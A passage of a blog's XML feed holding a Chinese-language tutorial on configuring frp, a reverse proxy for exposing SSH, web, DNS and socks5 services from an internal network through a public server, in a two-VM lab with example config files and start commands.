&#x2F;etc&#x2F;shadowsocks&#x2F;config.json -d start</span><br><span class="line">#  重启服务</span><br><span class="line">sudo ssserver -c &#x2F;etc&#x2F;shadowsocks&#x2F;config.json -d restart</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;安装所需包&quot;&gt;&lt;a href=&quot;#安装所需包&quot; class=&quot;headerlink&quot; title=&quot;安装所需包&quot;&gt;&lt;/a&gt;安装所需包&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;</summary>
      
    
    
    
    <category term="代理" scheme="https://administratorrs.github.io/categories/%E4%BB%A3%E7%90%86/"/>
    
    
    <category term="Linux" scheme="https://administratorrs.github.io/tags/Linux/"/>
    
    <category term="proxy" scheme="https://administratorrs.github.io/tags/proxy/"/>
    
  </entry>
  
  <entry>
    <title>frp</title>
    <link href="https://administratorrs.github.io/2021/02/11/%E4%BB%A3%E7%90%86/frp/frp/"/>
    <id>https://administratorrs.github.io/2021/02/11/%E4%BB%A3%E7%90%86/frp/frp/</id>
    <published>2021-02-10T16:00:00.000Z</published>
    <updated>2021-02-11T04:41:22.299Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>frp 是一个可用于内网穿透的高性能的反向代理应用，支持多种协议类型</p><ul><li>frp 为 C/S （客户端/服务端）架构</li><li>服务端的配置文件名为 frps.ini （公网）</li><li>客户端的配置文件名为 frpc.ini （内网）</li></ul><p><strong>下载地址：</strong><br><a href="https://github.com/fatedier/frp/tags">https://github.com/fatedier/frp/tags</a></p><p><strong>官方文档：</strong><br>中文：<a href="https://gofrp.org/docs/">https://gofrp.org/docs/</a><br>中文：<a href="https://github.com/fatedier/frp/blob/master/README_zh.md">https://github.com/fatedier/frp/blob/master/README_zh.md</a><br>英文：<a href="https://github.com/fatedier/frp#configuration-files">https://github.com/fatedier/frp#configuration-files</a></p><p><strong>文件介绍</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">frpc    #  客户端二进制文件</span><br><span class="line">frpc_full.ini#  客户端配置文件完整示例</span><br><span class="line">frpc.ini#  客户端配置文件</span><br><span class="line"></span><br><span class="line">frps    #  服务端二进制文件</span><br><span class="line">frps_full.ini#  服务端配置文件完整示例</span><br><span class="line">frps.ini#  服务端配置文件</span><br></pre></td></tr></table></figure><p><strong>实验环境</strong><br>VMware 15</p><ul><li>kali-1 IP：192.168.0.190（桥接模式，代替公网）</li><li>kali-2 IP：192.168.201.152（NAT模式，内网）</li></ul><h2 id="二、常用参数"><a href="#二、常用参数" class="headerlink" title="二、常用参数"></a>二、常用参数</h2><p>frps.ini（服务端，用于公网）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[common]#  共同配置，必需有该配置（请勿修改该代理名）</span><br><span class="line">bind_addr &#x3D; 0.0.0.0    #  绑定的 IP</span><br><span class="line">bind_port &#x3D; 7000    #  服务端监听的端口</span><br><span class="line">vhost_http_port &#x3D; 80#  为代理的 http 设置一个监听端口（通过域名访问网页时须使用此处设置的端口访问)</span><br><span class="line">vhost_https_port &#x3D; 443#  为代理的 https 设置一个监听端口（通过域名访问网页时须使用此处设置的端口访问)</span><br><span class="line"></span><br><span class="line">#  安全</span><br><span class="line">token &#x3D; 123#  设置身份验证</span><br><span class="line">log_file &#x3D; .&#x2F;frps.log#  指定日志路径</span><br><span class="line">log_level &#x3D; info#  指定日志级别（trace（跟踪）、debug（调试）、info（信息）、warn（警告）、error（错误）</span><br><span class="line">log_max_days &#x3D; 3    #  指定日志记录最大天数</span><br><span class="line">max_ports_per_client &#x3D; 0#  最大端口可用（默认为 0 ，表示无限制）</span><br><span class="line">allow_ports &#x3D; 2000-3000,3001,3003,4000-5000#  端口白名单</span><br><span class="line"></span><br><span class="line">#  传输</span><br><span class="line">tls_only &#x3D; false#  指定是否指接受 TLS 加密（默认为 false）</span><br><span class="line">tcp_mux &#x3D; true#  开启 tcp 流多路复用（默认为 true）</span><br></pre></td></tr></table></figure><p>frpc.ini（客户端，用于内网）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">[common]#  共同配置，必需有该配置（请勿修改该代理名）</span><br><span class="line">server_add &#x3D; 192.168.0.190#  服务端 IP（需和服务端的 IP 配置为一致）</span><br><span class="line">server_port &#x3D; 7000#  服务端端口（需和服务端的端口配置为一致）</span><br><span class="line">dns_server &#x3D; 8.8.8.8#  指定 DNS 服务器</span><br><span class="line">start &#x3D; ssh,web#  启用代理名称为 ssh 跟 web 的代理（默认为空格，表示启用所有代理）</span><br><span class="line">user &#x3D; test_name#  连接时在代理名称前面添加 test_name. （如当前代理名称为 common ，则 test_name.common）</span><br><span class="line"></span><br><span class="line">#  安全</span><br><span class="line">token &#x3D; 123        #  设置身份验证（必须与服务端相同）</span><br><span class="line">log_file &#x3D; .&#x2F;frpc.log#  指定日志路径（如指定了日志文件，则控制台不会显示相关信息（会显示在日志文件里））</span><br><span class="line">log_level &#x3D; info#  指定日志级别（trace（跟踪）、debug（调试）、info（信息）、warn（警告）、error（错误）</span><br><span class="line">log_max_days &#x3D; 3    #  指定日志记录最大天数</span><br><span class="line"></span><br><span class="line">#  传输</span><br><span class="line">login_faile_exit &#x3D; true#  首次跟服务器连接失败时退出程序，如为 false 则失败后重新尝试连接（默认为 true）</span><br><span class="line">protocol &#x3D; tcp    #  用于连接服务器的通信协议（支持 tcp、kcp、websocket，默认为 tcp）</span><br><span class="line">tls_enable &#x3D; true#  通过 tls 连接服务端</span><br><span class="line">tcp_mux &#x3D; true    #  开启 tcp 流多路复用（默认为 true，必须与服务端相同）</span><br><span class="line"></span><br><span class="line">[ssh]        #  代理名称</span><br><span class="line">type &#x3D; tcp        #  协议型</span><br><span class="line">local_ip &#x3D; 127.0.0.1</span><br><span class="line">local_port &#x3D; 22    #  需代理的端口</span><br><span class="line">remote_port &#x3D; 6000    #  远程端口（远程访问时使用此端口，如为 0 则服务端随机分配一个端口）</span><br><span class="line">bandwidth_limit &#x3D; 1MB#  限制此代理的宽带（单位为 KB 和 MB）</span><br><span class="line">use_encryption &#x3D; true#  如为 true 则与服务端的通信会被加密（默认为 false）</span><br><span class="line">use_compression &#x3D; false#  如为 true 则消息将被压缩</span><br><span class="line"></span><br><span class="line">[web]#  代理名称</span><br><span class="line">type &#x3D; http#  类型</span><br><span class="line">local_ip &#x3D; 127.0.0.1</span><br><span class="line">local_port &#x3D; 80    #  需代理的端口</span><br><span class="line">use_encryption &#x3D; true#  如为 true 则与服务端的通信会被加密（默认为 false）</span><br><span class="line">use_compression &#x3D; false#  如为 true 则消息将被压缩</span><br><span class="line">http_user &#x3D; admin    #  访问网页时需要的用户名</span><br><span class="line">http_pwd &#x3D; passwd    #  密码</span><br><span class="line">subdomain &#x3D; test.com#  子域名</span><br><span class="line">custom_domains &#x3D; www.test.com#  域名</span><br></pre></td></tr></table></figure><hr><h2 id="三、基于-SSH"><a href="#三、基于-SSH" class="headerlink" title="三、基于 SSH"></a>三、基于 SSH</h2><p>1、由于是基于 ssh 的，所以需开启内网的 ssh 确保能正常连接（ kali 默认关闭 ssh ）</p><ul><li><p>1）ssh 配置文件默认路径为 <code>/etc/ssh/sshd_config</code><br>找到图中的两个地方，并修改为一样的即可<br><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E4%BB%A3%E7%90%86/frp/frp/ssh-1.png"><br><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E4%BB%A3%E7%90%86/frp/frp/ssh-2.png"></p></li><li><p>2）修改完后需重启服务：<code>sudo systemctl restart ssh</code></p></li></ul><p>2、配置服务端 frps.ini</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[common]            #  共同配置，必需有该配置（请勿修改该代理名）</span><br><span class="line">bind_port &#x3D; 7000    #  frps 监听的端口</span><br></pre></td></tr></table></figure><p>启动服务：<code>sudo ./frps -c ./frps.ini</code></p><p>3、配置客户端 frpc.ini</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[common]          #  共同配置，必需有该配置（请勿修改该代理名）</span><br><span class="line">server_addr &#x3D; 192.168.0.190     #  服务端 IP（需和服务端的 IP 配置为一致）</span><br><span class="line">server_port &#x3D; 7000              #  服务端端口（需和服务端的端口配置为一致）</span><br><span class="line"></span><br><span class="line">[ssh]                   #  代理名称</span><br><span class="line">type &#x3D; tcp              #  协议类型</span><br><span class="line">local_ip &#x3D; 127.0.0.1</span><br><span class="line">local_port &#x3D; 22         #  需代理的本地端口（需能正常访问）</span><br><span class="line">remote_port &#x3D; 6000      #  远程端口（远程访问时使用的端口）</span><br></pre></td></tr></table></figure><p>启动服务 <code>sudo ./frpc -c ./frpc.ini</code></p><p>4、使用 xshell 进行连接<br><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E4%BB%A3%E7%90%86/frp/frp/ssh-3.png"><br><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E4%BB%A3%E7%90%86/frp/frp/ssh-4.png"><br><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E4%BB%A3%E7%90%86/frp/frp/ssh-5.png"></p><hr><h2 id="四、基于-WEB"><a href="#四、基于-WEB" class="headerlink" title="四、基于 WEB"></a>四、基于 WEB</h2><h3 id="提供简单的文件访问服务"><a href="#提供简单的文件访问服务" class="headerlink" title="提供简单的文件访问服务"></a>提供简单的文件访问服务</h3><ul><li>1）配置服务端 frps.ini</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[common]            #  共同配置，必需有该配置（请勿修改该代理名）</span><br><span class="line">bind_port &#x3D; 7000    #  frps 监听的端口</span><br></pre></td></tr></table></figure><p>启动服务：<code>sudo ./frps -c ./frps.ini</code></p><ul><li>2）配置客户端 frpc.ini</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[common]        #  共同配置，必需有该配置（请勿修改该代理名）</span><br><span class="line">server_addr &#x3D; 192.168.0.190 #  服务端 IP（需和服务端的 IP 配置为一致）</span><br><span class="line">server_port &#x3D; 7000          #  服务端端口（需和服务端的端口配置为一致）</span><br><span class="line"></span><br><span class="line">[plugin_static_file]        #  代理名称</span><br><span class="line">type &#x3D; tcp                  #  协议类型</span><br><span class="line">remote_port &#x3D; 6002          #  远程端口（远程访问时使用的端口）</span><br><span class="line">plugin &#x3D; static_file        #  加载 static_file 插件</span><br><span class="line">plugin_local_path &#x3D; &#x2F;var    #  须访问的路径</span><br><span class="line">plugin_http_user &#x3D; admin    #  用户名</span><br><span class="line">plugin_http_passwd &#x3D; passwd #  密码</span><br></pre></td></tr></table></figure><p>启动服务：<code>sudo ./frpc -c ./frpc.ini</code></p><ul><li>3）服务端使用浏览器访问<br><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E4%BB%A3%E7%90%86/frp/frp/wj-1.png"><br><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E4%BB%A3%E7%90%86/frp/frp/wj-2.png"></li></ul><h3 id="基于-IP-访问-http"><a href="#基于-IP-访问-http" class="headerlink" title="基于 IP 访问 http"></a>基于 IP 访问 http</h3><ul><li>1）配置服务端 frps.ini</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[common]            #  共同配置，必需有该配置（请勿修改该代理名）</span><br><span class="line">bind_port &#x3D; 7000    #  frps 监听的端口</span><br><span class="line">vhost_http_port &#x3D; 2333      #  为代理的 http 设置一个监听端口（通过域名访问网页时须使用此处设置的端口访问)</span><br></pre></td></tr></table></figure><p>启动服务：<code>sudo ./frps -c ./frps.ini</code></p><ul><li>2）配置客户端 frpc.ini</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[common]            #  共同配置，必需有该配置（请勿修改该代理名）</span><br><span class="line">server_addr &#x3D; 192.168.0.190     #  服务端 IP（需和服务端的 IP 配置为一致）</span><br><span class="line">server_port &#x3D; 7000              #  服务端端口（需和服务端的端口配置为一致）</span><br><span class="line"></span><br><span class="line">[web]                   #  代理名称</span><br><span class="line">type &#x3D; tcp              #  协议类型</span><br><span class="line">local_ip &#x3D; 127.0.0.1</span><br><span class="line">local_port &#x3D; 80         #  需代理的本地端口（需能正常访问）</span><br><span class="line">remote_port &#x3D; 7890      #  远程端口（通过 IP 访问网页时须使用此处设置的端口访问）</span><br></pre></td></tr></table></figure><p>启动服务：<code>sudo ./frpc -c ./frpc.ini</code></p><p><strong>或客户端 frpc.ini 配置文件内容为</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[common]            #  共同配置，必需有该配置（请勿修改该代理名）</span><br><span class="line">server_addr &#x3D; 192.168.0.190     #  服务端 IP（需和服务端的 IP 配置为一致）</span><br><span class="line">server_port &#x3D; 7000              #  服务端端口（需和服务端的端口配置为一致）</span><br><span class="line"></span><br><span class="line">#  访问时使用服务端 vhost_http_port 参数设置的端口进行访问</span><br><span class="line">[web]                   #  代理名称</span><br><span class="line">type &#x3D; http             #  协议类型</span><br><span class="line">local_ip &#x3D; 127.0.0.1</span><br><span class="line">local_port &#x3D; 80         #  需代理的本地端口（需能正常访问）</span><br><span class="line">custom_domains &#x3D; 192.168.0.190  #  服务端 IP</span><br></pre></td></tr></table></figure><ul><li>3）服务端使用浏览器访问<br><img src= "/img/loading.gif" data-lazy-src="http/http_ip-2.png"></li></ul><p>3、基于域名访问 http</p><ul><li>1）配置服务端 frps.ini</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[common]            #  共同配置，必需有该配置（请勿修改该代理名）</span><br><span class="line">bind_port &#x3D; 7000    #  frp 监听的端口</span><br><span class="line">vhost_http_port &#x3D; 2333      #  为代理的 http 设置一个监听端口（通过域名访问网页时须使用此处设置的端口访问)</span><br></pre></td></tr></table></figure><p>启动服务：<code>sudo ./frps -c ./frps.ini</code></p><ul><li>2）配置客户端 frpc.ini</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[common]        #  共同配置，必需有该配置（请勿修改该代理名）</span><br><span class="line">server_addr &#x3D; 192.168.0.190     #  服务端 IP（需和服务端的 IP 配置为一致）</span><br><span class="line">server_port &#x3D; 7000              #  服务端端口（需和服务端的端口配置为一致）</span><br><span class="line"></span><br><span class="line">[web]                   #  代理名称</span><br><span class="line">type &#x3D; http             #  协议类型</span><br><span class="line">local_ip &#x3D; 127.0.0.1</span><br><span class="line">local_port &#x3D; 80         #  需代理的本地端口（需能正常访问）</span><br><span class="line">remote_port &#x3D; 7890      #  远程端口（通过 IP 访问网页时须使用此处设置的端口访问）</span><br><span class="line">custom_domains &#x3D; www.test.com   #  设置需代理的域名（需能正常访问）</span><br></pre></td></tr></table></figure><p>启动服务：<code>sudo ./frps -c ./frps.ini</code></p><ul><li><p>3）由于是基于域名访问的所以须在服务端创建相应的域名记录<br><img src= "/img/loading.gif" data-lazy-src="http/http.png"></p></li><li><p>4）服务端使用浏览器访问<br><img src= "/img/loading.gif" data-lazy-src="http/http-2.png"></p></li></ul><p>4、基于域名访问 https<br><strong>此处环境更改为:</strong><br>VMware 15</p><ul><li>kali-1（服务端） IP：192.168.0.190（桥接模式，代替公网）</li><li>Centos（客户端，搭建了 DNS、https 服务） IP：192.168.201.152（NAT模式，内网）</li></ul><br>- 1）配置服务端 frps.ini<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[common]            #  共同配置，必需有该配置（请勿修改该代理名）</span><br><span class="line">bind_port &#x3D; 7000            #  服务端 frp 监听的端口</span><br><span class="line">vhost_https_port &#x3D; 4433     #  为代理的 https 设置一个监听端口（通过域名访问网页时须使用此处设置的端口访问)</span><br></pre></td></tr></table></figure><p>启动服务：<code>sudo ./frps -c ./frps.ini</code></p><ul><li>2）配置客户端 frpc.ini</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[common]            #  共同配置，必需有该配置（请勿修改该代理名）</span><br><span class="line">server_addr &#x3D; 192.168.0.190     #  服务端 IP（需和服务端的 IP 配置为一致）</span><br><span class="line">server_port &#x3D; 7000              #  服务端端口（需和服务端的端口配置为一致）</span><br><span class="line"></span><br><span class="line">[https]                         #  代理名称</span><br><span class="line">type &#x3D; https                    #  协议类型</span><br><span class="line">custom_domains &#x3D; www.test.com   #  设置需代理的域名（需能正常访问）</span><br><span class="line">plugin &#x3D; https2http             #  加载 https2http 插件</span><br><span class="line">plugin_local_addr &#x3D; 127.0.0.1</span><br><span class="line">plugin_crt_path &#x3D; &#x2F;etc&#x2F;pki&#x2F;tls&#x2F;certs&#x2F;localhost.crt      #  设置本地证书</span><br><span class="line">plugin_key_path &#x3D; &#x2F;etc&#x2F;pki&#x2F;tls&#x2F;private&#x2F;localhost.key    #  设置本地密钥</span><br><span class="line">plugin_host_header_rewrite &#x3D; 127.0.0.1</span><br><span class="line">plugin_header_X-From-Where &#x3D; frp</span><br></pre></td></tr></table></figure><p>启动服务：<code>sudo ./frpc -c ./frpc.ini</code></p><ul><li>3）由于是基于域名访问的所以须在服务端创建相应的域名记录<br><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E4%BB%A3%E7%90%86/frp/frp/hosts.png"></li><li>4）服务端使用浏览器访问<br><img src= "/img/loading.gif" data-lazy-src="https.png"></li></ul><p>5、仪表盘（检查 frp 状态和代理信息的统计）</p><ul><li>1）配置服务端 frps.ini</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[common]       #  共同配置，必需有该配置（请勿修改该代理名）</span><br><span class="line">bind_port &#x3D; 7000            #  服务端 frp 监听的端口</span><br><span class="line">dashboard_port &#x3D; 7500       #  仪表盘监听的端口</span><br><span class="line">dashboard_user &#x3D; admin      #  仪表盘的用户名</span><br><span class="line">dashboard_pwd &#x3D; passwd      #  仪表盘的密码</span><br><span class="line">max_pool_count &#x3D; 5          #  创建地址池连接上限</span><br><span class="line">vhost_http_port &#x3D; 2333      #  为代理的 http 设置一个监听端口</span><br></pre></td></tr></table></figure><p>启动服务：<code>sudo ./frps -c ./frps.ini</code></p><ul><li>2）使用浏览器访问并输入用户名跟密码<br><img src= "/img/loading.gif" data-lazy-src="http/dashboard-1.png"><br><img src= "/img/loading.gif" data-lazy-src="http/dashboard-2.png"></li></ul><p>6、管理界面（用于管理客户端，可实现热加载）</p><ul><li>1）配置服务端 frps.ini</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[common]            #  共同配置，必需有该配置（请勿修改该代理名）</span><br><span class="line">bind_port &#x3D; 7000    #  frp 监听的端口</span><br></pre></td></tr></table></figure><p>启动服务 <code>sudo ./frps -c ./frps.ini</code></p><ul><li>2）配置客户端 frpc.ini</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[common]        #  共同配置，必需有该配置（请勿修改该代理名）</span><br><span class="line">server_addr &#x3D; 192.168.0.190     #  服务端 IP（需和服务端的 IP 配置为一致）</span><br><span class="line">server_port &#x3D; 7000              #  服务端端口（需和服务端的端口配置为一致）</span><br><span class="line">admin_addr &#x3D; 127.0.0.1          #  管理地址</span><br><span class="line">admin_port &#x3D; 7400               #  监听的端口</span><br><span class="line">admin_user &#x3D; admin              #  访问时的用户名</span><br><span class="line">admin_pwd &#x3D; passwd              #  访问时的密码</span><br><span class="line"></span><br><span class="line">#  管理界面默认只能本地访问，所以需将端口代理出去实现公网访问</span><br><span class="line">[web_admin]                   #  代理名称</span><br><span class="line">type &#x3D; tcp                    #  协议类型</span><br><span class="line">local_ip &#x3D; 127.0.0.1      </span><br><span class="line">local_port &#x3D; 7400             #  需代理的本地端口（需能正常访问）</span><br><span class="line">remote_port &#x3D; 7400            #  远程端口（访问时使用的端口）</span><br></pre></td></tr></table></figure><p>启动服务 <code>sudo ./frpc -c ./frpc.ini</code></p><ul><li>3） 服务端使用浏览器访问<br><img src= "/img/loading.gif" data-lazy-src="http/http_admin.png"></li></ul><hr><h2 id="五、基于-DNS"><a href="#五、基于-DNS" class="headerlink" title="五、基于 DNS"></a>五、基于 DNS</h2><p>1、配置服务端 frps.ini</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[common]        #  共同配置，必需有该配置（请勿修改该代理名）</span><br><span class="line">bind_port &#x3D; 7000        #  服务端 frp 监听的端口</span><br></pre></td></tr></table></figure><p>启动服务：<code>sudo ./frps -c ./frps.ini</code></p><p>2、配置客户端 frpc.ini</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[common]            #  共同配置，必需有该配置（请勿修改该代理名）</span><br><span class="line">server_addr &#x3D; 192.168.0.190     #  服务端 IP（需和服务端的 IP 配置为一致）</span><br><span class="line">server_port &#x3D; 7000              #  服务端端口（需和服务端的端口配置为一致）</span><br><span class="line"></span><br><span class="line">[ssh]                   #  代理名称</span><br><span class="line">type &#x3D; tcp              #  协议类型</span><br><span class="line">local_ip &#x3D; 127.0.0.1</span><br><span class="line">local_port &#x3D; 22         #  需代理的本地端口（需能正常访问）</span><br><span class="line">remote_port &#x3D; 6000      #  远程端口（访问时使用的端口）</span><br><span class="line"></span><br><span class="line">[DNS]                   #  代理名称</span><br><span class="line">type &#x3D; udp              #  协议类型</span><br><span class="line">local_ip &#x3D; 127.0.0.1</span><br><span class="line">local_port &#x3D; 53         #  需代理的本地端口（需能正常访问）</span><br><span class="line">remote_port &#x3D; 5333      #  远程端口（访问时使用的端口）</span><br></pre></td></tr></table></figure><p>启动服务：<code>sudo ./frpc -c ./frpc.ini</code></p><p>3、在服务端使用 <code>dig @192.168.0.190 -p 5333 -x 192.168.201.147</code> 查看与 192.168.201.147 相关的域名解析</p><p><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E4%BB%A3%E7%90%86/frp/frp/dns-2.png"></p><hr><h2 id="六、socks5"><a href="#六、socks5" class="headerlink" title="六、socks5"></a>六、socks5</h2><p>1、配置服务端 frps.ini</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[common]            #  共同配置，必需有该配置（请勿修改该代理名）</span><br><span class="line">bind_port &#x3D; 7000    #  frp 监听的端口</span><br></pre></td></tr></table></figure><p>启动服务：<code>sudo ./frps -c ./frps.ini</code></p><p>2、配置客户端 frpc.ini</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[common]                #  共同配置，必需有该配置（请勿修改该代理名）</span><br><span class="line">server_addr &#x3D; 192.168.0.190 #  服务端 IP（需和服务端的 IP 配置为一致）</span><br><span class="line">server_port &#x3D; 7000          #  服务端端口（需和服务端的端口配置为一致）</span><br><span class="line"></span><br><span class="line">[plugin_socks]              #  代理名称</span><br><span class="line">type &#x3D; tcp                  #  协议类型</span><br><span class="line">remote_port &#x3D; 8899          #  远程端口（服务端连接时使用此端口，如为 0 则服务端随机分配一个端口）</span><br><span class="line">plugin &#x3D; socks5             #  加载 socks5 插件</span><br><span class="line">plugin_user &#x3D; admin         #  用户名</span><br><span class="line">plugin_passwd &#x3D; passwd      #  密码</span><br><span class="line">use_encryption &#x3D; true       #  如为 true 则与服务端的通信会被加密（默认为 false）</span><br><span class="line">use_compression &#x3D; true      #  如为 true 则消息将被压缩</span><br></pre></td></tr></table></figure><p>启动服务：<code>sudo ./frpc -c ./frpc.ini</code></p><p>3、使用 Proxifier 进行连接<br><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E4%BB%A3%E7%90%86/frp/frp/lianjie-1.png"><br>4、点击检查测试是否能正常连接<br><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E4%BB%A3%E7%90%86/frp/frp/lianjie-2.png"><br>5、代理完成<br><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E4%BB%A3%E7%90%86/frp/frp/lianjie-3.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一、简介&quot;&gt;&lt;a href=&quot;#一、简介&quot; class=&quot;headerlink&quot; title=&quot;一、简介&quot;&gt;&lt;/a&gt;一、简介&lt;/h2&gt;&lt;p&gt;frp 是一个可用于内网穿透的高性能的反向代理应用，支持多种协议类型&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;frp 为 C/S （客户端</summary>
      
    
    
    
    <category term="代理" scheme="https://administratorrs.github.io/categories/%E4%BB%A3%E7%90%86/"/>
    
    
    <category term="proxy" scheme="https://administratorrs.github.io/tags/proxy/"/>
    
    <category term="内网" scheme="https://administratorrs.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu配置 socks5</title>
    <link href="https://administratorrs.github.io/2021/02/11/%E4%BB%A3%E7%90%86/ubuntu%20%E9%85%8D%E7%BD%AE%20socks5/socks5/"/>
    <id>https://administratorrs.github.io/2021/02/11/%E4%BB%A3%E7%90%86/ubuntu%20%E9%85%8D%E7%BD%AE%20socks5/socks5/</id>
    <published>2021-02-10T16:00:00.000Z</published>
    <updated>2021-02-11T04:24:14.508Z</updated>
    
